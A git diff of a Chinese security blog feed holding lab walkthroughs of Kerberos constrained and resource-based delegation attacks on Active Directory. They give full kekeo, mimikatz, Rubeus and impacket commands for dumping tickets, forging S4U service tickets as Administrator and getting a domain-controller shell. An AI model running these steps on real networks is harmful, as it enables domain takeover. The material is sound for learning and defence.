@@ -330,7 +330,7 @@
 
 <p><strong>二、通过ActiveDirectory模块添加</strong></p>
 <p>只有Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项，域内普通主机是不存在ActiveDirectory模块的，但是可以将DLL文件复制出来，然后导入即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount evilsystem$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
 
 <img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318133951958.png" class title="image-20220318133951958">
 
@@ -393,7 +393,7 @@
 <p>这里可以看到申请的servicename本来应该为cifs&#x2F;PC2（host&#x2F;PC2），但是这里只有win7，这是因为服务名称丢失了，只需要补上就可以了。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
 
-<p>如下（这里我一直使用的base64值，因为使用）</p>
+<p>如下（这里我一直使用的是加密后的base64，因为使用kirbi会报莫名其妙的错误）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:请求cifs票据的base64值 /altservice:cifs/PC2.whoamianony.org /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:请求host票据的base64值 /altservice:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
 
 <p>未申请之前</p>
@@ -478,6 +478,205 @@
 
 <p>这里有个坑，要在&#x2F;etc&#x2F;hosts下手动把PC2.whoamianony.org解析成192.168.93.40</p>
 <p>impacket工具包里面的脚本是可以完成基于资源的约束委派的攻击的，这里就不再研究了，原理都是一样的，只是使用的脚本方法不一样。</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>约束委派的原理及利用</title>
+    <url>/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非约束性委派被委派的机器会直接得到发布委派的用户的TGT，是十分不安全的，因此微软推出了约束性委派，添加了s4u2self与s4u2proxy协议，以增加安全性。假设有这么一种情况，用户A委派service1去访问service2,那么大概的访问过程如下：</p>
+<p>1、用户A访问service1。</p>
+<p>2、service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。</p>
+<p>3、service1以用户A的身份访问KDC通过s4u2proxy协议请求一个访问service2的可转发的ticket。</p>
+<p>4、service1获取到ticket并以用户A的名义访问service2。</p>
+<p>整个约束委派涉及到两个ticket票据，其实在我看来和kerbores的认证过程有异曲同工之妙，第一个ticket是证明service1可以代表用户A，第二个ticket代表service1可以代替用户A访问service2，只有kdc里面的tgs可以颁发ticket，所以这两个ticket都是由域控来授权的。</p>
+<p>还是用上一篇博客引用的图片来解释一下</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316210130668.png" class title="image-20220316210130668">
+
+<p>如果，hostB配置了约束委派，那么他就可以被任意用户A委派去访问hostC上特定的某一服务，比如cifs。与非约束委派的区别就是，限制了hostB可以访问的主机和此主机上的某个服务，但没有限制谁能对hostB发起委派请求。</p>
+<p>那么s4u2self与s4u2proxy协议是什么呢？</p>
+<p>s4u是对kerberos协议的一个拓展，s4u包含了两个子协议s4u2self和s4u2proxy，这两个协议都能向kdc发起票据请求。s4u2self是代表自己向kdc请求一个自己可以代表用户A的票据（ST），s4u2proxy是可以让service1以用户A的名义向kdc请求一个可以访问service2的票据。这两个票据有先后关系，service1必须先向kdc证明自己可以代表用户A（第一个票据），然后才能通过kdc的票据向service2发起请求（第二个票据）。一共向kdc发起了<strong>两次</strong>票据请求。</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316211012120.png" class title="image-20220316211012120">
+
+
+
+<h1 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控    192.168.93.30   主机名DC</p>
+<p>域成员  192.168.93.40  主机名PC2   用户名moretz</p>
+<p>域控为域用户配置spn，为moretz用户配置约束委派，为DC机器的cifs服务做委派</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317095916068.png" class title="image-20220317095916068">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100047876.png" class title="image-20220317100047876">
+
+
+
+<p>设置完成后</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100354131.png" class title="image-20220317100354131">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102956972.png" class title="image-20220317102956972">
+
+<p>此时就配置完成了moretz（PC2）对DC的cifs的委派</p>
+<h2 id="0x01发现委派主机"><a href="#0x01发现委派主机" class="headerlink" title="0x01发现委派主机"></a>0x01发现委派主机</h2><h3 id="idapsearch"><a href="#idapsearch" class="headerlink" title="idapsearch"></a>idapsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317101321257.png" class title="image-20220317101321257">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103143976.png" class title="image-20220317103143976">
+
+<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102424078.png" class title="image-20220317102424078">
+
+<p>过滤条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306368)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103023681.png" class title="image-20220317103023681">
+
+<p>过滤条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306369)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02约束委派的攻击"><a href="#0x02约束委派的攻击" class="headerlink" title="0x02约束委派的攻击"></a>0x02约束委派的攻击</h2><h3 id="有明文密码或者ntml的条件下"><a href="#有明文密码或者ntml的条件下" class="headerlink" title="有明文密码或者ntml的条件下"></a>有明文密码或者ntml的条件下</h3><p>使用kekeo结合约束委派用户的明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /password:Moretz2021</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105105163.png" class title="image-20220317105105163">
+
+
+
+<p>使用ntml hash也可以</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105506938.png" class title="image-20220317105506938">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:moretz /domain:whoamianony.org /NTLM:抓到的hash值</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317105620181.png" class title="image-20220317105620181">
+
+
+
+<p>使用这个tgt通过伪造s4u请求以administrator用户身份请求访问DC的cifs的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_moretz@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110301712.png" class title="image-20220317110301712">
+
+
+
+<p>使用获得的s4u2proxy的tgt进行ptt</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110416001.png" class title="image-20220317110416001">
+
+<p>在ptt之前不能访问DC的目录</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110502870.png" class title="image-20220317110502870">
+
+
+
+<p>使用mimikatz进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110852382.png" class title="image-20220317110852382">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317110914857.png" class title="image-20220317110914857">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111243140.png" class title="image-20220317111243140">
+
+<p>注：这里也不是黄金票据，制作黄金票据的条件是缺一不可的</p>
+<h3 id="无明文密码或hash的情况下直接从内存中导入票据"><a href="#无明文密码或hash的情况下直接从内存中导入票据" class="headerlink" title="无明文密码或hash的情况下直接从内存中导入票据"></a>无明文密码或hash的情况下直接从内存中导入票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317111656366.png" class title="image-20220317111656366">
+
+
+
+<p>然后可以直接伪造s4u请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;17bae4]-2-0-60a10000-moretz@krbtgt-WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112009861.png" class title="image-20220317112009861">
+
+
+
+<p>现在是无法访问域控的</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112141194.png" class title="image-20220317112141194">
+
+<p>然后使用mimikatz进行ptt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112242012.png" class title="image-20220317112242012">
+
+
+
+<p>访问成功</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317112612208.png" class title="image-20220317112612208">
+
+
+
+<p>上面是域服务用户存在约束委派，如果是域主机存在约束委派</p>
+<p>使用mimikatz抓取域主机PC2的ntml</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317133949487.png" class title="image-20220317133949487">
+
+
+
+<p>使用keko制作可以供PC2自己转发的tgt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:PC2$ /domain:whoamianony.org /NTLM:46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142007857.png" class title="image-20220317142007857">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142022983.png" class title="image-20220317142022983">
+
+<p>这里的tgt是第一次向kdc申请的ST1</p>
+<p>使用请求到的tgt进行s4uproxy伪造请求ST2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_PC2$@WHOAMIANONY.ORG_krbtgt~whoamianony.org@WHOAMIANONY.ORG.kirbi /user:Administrator@whoamianony.org /service:cifs/DC.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142437649.png" class title="image-20220317142437649">
+
+
+
+<p>未进行ptt之前是不能访问DC的 </p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142727658.png" class title="image-20220317142727658">
+
+<p>使用mimikatz进行ptt,注意tgs别选错了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt TGS_Administrator@whoamianony.org@WHOAMIANONY.ORG_cifs~DC.whoamianony.org@WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317142746120.png" class title="image-20220317142746120">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317150805823.png" class title="image-20220317150805823">
+
+
+
+<p>注：这里一定要是以本机administrator打开的dir \\DC\c$，因为我们生成的票据是针对administrator账号的，虽然都是同一台主机但是administrator和普通用户moretz的票据是不同的</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317151028741.png" class title="image-20220317151028741">
+
+
+
+<h3 id="在域环境外通过约束委派进行攻击"><a href="#在域环境外通过约束委派进行攻击" class="headerlink" title="在域环境外通过约束委派进行攻击"></a>在域环境外通过约束委派进行攻击</h3><p>域外指的是通过隧道工具接入内网</p>
+<p>使用的是impacket工具包里面的一个脚本</p>
+<p>探测约束委派的用户和主机</p>
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152901164.png" class title="image-20220317152901164">
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317152914875.png" class title="image-20220317152914875">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.93.30 -spn cifs/DC -impersonate administrator whoamianony.org/PC2$ -hash :46d4391cec690c80efc906d2fdd594f8</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153057662.png" class title="image-20220317153057662">
+
+
+
+<p>加载在ccache中的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317153129374.png" class title="image-20220317153129374">
+
+
+
+<p>利用psexec.py可以直接登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -no-pass -k DC</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317155009305.png" class title="image-20220317155009305">
+
+<p>这里我不明白为什么能直接返回约束委派服务的主机的system的shell，我的约束委派主机是192.168.93.40 的moretz（PC2），设置的可以访问192.168.93.30 DC的cifs服务。预期可能是administrator的权限，但是返回了system权限不太懂。</p>
 ]]></content>
       <categories>
         <category>内网</category>
@@ -995,205 +1194,6 @@
 
 <p>使用mimikatz导入票据后，跟之前一样也是个有域控本地管理员权限的，用mimikatz制作黄金票据后可以用psexec.exe反弹shell，不需要账号密码。（lsadump）</p>
 <img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174621620.png" class title="image-20220316174621620">
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>约束委派的原理及利用</title>
-    <url>/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非约束性委派被委派的机器会直接得到发布委派的用户的TGT，是十分不安全的，因此微软推出了约束性委派，添加了s4u2self与s4u2proxy协议，以增加安全性。假设有这么一种情况，用户A委派service1去访问service2,那么大概的访问过程如下：</p>
-<p>1、用户A访问service1。</p>
-<p>2、service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。</p>
-<p>3、service1以用户A的身份访问KDC通过s4u2proxy协议请求一个访问service2的可转发的ticket。</p>
-<p>4、service1获取到ticket并以用户A的名义访问service2。</p>
-<p>整个约束委派涉及到两个ticket票据，其实在我看来和kerbores的认证过程有异曲同工之妙，第一个ticket是证明service1可以代表用户A，第二个ticket代表service1可以代替用户A访问service2，只有kdc里面的tgs可以颁发ticket，所以这两个ticket都是由域控来授权的。</p>
-<p>还是用上一篇博客引用的图片来解释一下</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316210130668.png" class title="image-20220316210130668">
-
-<p>如果，hostB配置了约束委派，那么他就可以被任意用户A委派去访问hostC上特定的某一服务，比如cifs。与非约束委派的区别就是，限制了hostB可以访问的主机和此主机上的某个服务，但没有限制谁能对hostB发起委派请求。</p>
-<p>那么s4u2self与s4u2proxy协议是什么呢？</p>
-<p>s4u是对kerberos协议的一个拓展，s4u包含了两个子协议s4u2self和s4u2proxy，这两个协议都能向kdc发起票据请求。s4u2self是代表自己向kdc请求一个自己可以代表用户A的票据（ST），s4u2proxy是可以让service1以用户A的名义向kdc请求一个可以访问service2的票据。这两个票据有先后关系，service1必须先向kdc证明自己可以代表用户A（第一个票据），然后才能通过kdc的票据向service2发起请求（第二个票据）。一共向kdc发起了<strong>两次</strong>票据请求。</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316211012120.png" class title="image-20220316211012120">
-
-
-
-<h1 id="约束委派的利用"><a href="#约束委派的利用" class="headerlink" title="约束委派的利用"></a>约束委派的利用</h1><h2 id="0x00部署环境"><a href="#0x00部署环境" class="headerlink" title="0x00部署环境"></a>0x00部署环境</h2><p>域控    192.168.93.30   主机名DC</p>
-<p>域成员  192.168.93.40  主机名PC2   用户名moretz</p>
-<p>域控为域用户配置spn，为moretz用户配置约束委派，为DC机器的cifs服务做委派</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317095916068.png" class title="image-20220317095916068">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100047876.png" class title="image-20220317100047876">
-
-
-
-<p>设置完成后</p>
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317100354131.png" class title="image-20220317100354131">
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102956972.png" class title="image-20220317102956972">
-
-<p>此时就配置完成了moretz（PC2）对DC的cifs的委派</p>
-<h2 id="0x01发现委派主机"><a href="#0x01发现委派主机" class="headerlink" title="0x01发现委派主机"></a>0x01发现委派主机</h2><h3 id="idapsearch"><a href="#idapsearch" class="headerlink" title="idapsearch"></a>idapsearch</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317101321257.png" class title="image-20220317101321257">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.93.30:389 -D &quot;CN=moretz,CN=Users,DC=whoamianony,DC=org&quot; -w Moretz2021 -b &quot;DC=whoamianony,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103143976.png" class title="image-20220317103143976">
-
-<h3 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317102424078.png" class title="image-20220317102424078">
-
-<p>过滤条件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(samAccountType=805306368)(msds-allowedtodelegateto=*)</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=whoamianony,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/16/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220317103023681.png" class title="image-20220317103023681">
-
-<p>过滤条件</p>
